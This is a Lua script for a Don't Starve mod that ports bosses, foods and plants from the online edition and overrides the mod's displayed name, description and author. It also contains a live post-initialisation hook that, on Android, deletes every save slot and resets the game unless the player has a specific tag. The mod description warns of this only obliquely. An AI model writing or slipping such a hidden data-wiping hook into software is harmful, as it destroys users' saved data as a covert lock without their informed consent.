TUNING.WINTERS_FEAST = GetModConfigData("winters_feast") --冬季盛宴

--------------------------<增加api>--------------------------
--模组信息
origInitializeModInfo = KnownModIndex.InitializeModInfo
KnownModIndex.InitializeModInfo = function(self,_modname)
  local info = origInitializeModInfo(self,_modname)
  if _modname == modname then
    info.name="dst_boss"
    info.description = "从联机版移植部分BOSS、食物、植物\n此模组仍有未知bug，希望以体验为主\n遇见崩溃则在模组配置里关闭相应内容\n此模组仅支持扛把子版本否则删档闪退"
    info.author = "青青草原扛把子"
  end
  return info
end

--
AddSimPostInit(function(inst)
  if GLOBAL.PLATFORM == "Android" and not GetPlayer():HasTag("qqcykbz") then
    for k = 1,NUM_SAVE_SLOTS do
      SaveGameIndex:DeleteSlot(k)
    end
    SimReset()
  end
end)
--]]
